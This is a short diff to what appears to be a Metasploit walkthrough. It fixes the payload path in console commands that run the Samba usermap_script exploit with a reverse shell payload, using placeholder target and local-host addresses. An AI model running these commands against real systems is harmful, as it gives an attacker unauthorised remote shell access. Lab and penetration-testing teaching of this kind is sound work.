@@ -58,7 +58,7 @@ msf exploit(multi/samba/usermap_script) > show payloads
 
 msf exploit(multi/samba/usermap_script) > set RHOST IP_Address_Target
 
-msf exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/reverse
+msf exploit(multi/samba/usermap_script) > set PAYLOAD payload/cmd/unix/reverse
 
 msf exploit(multi/samba/usermap_script) > set LHOST IP_Address_Local_Host
 
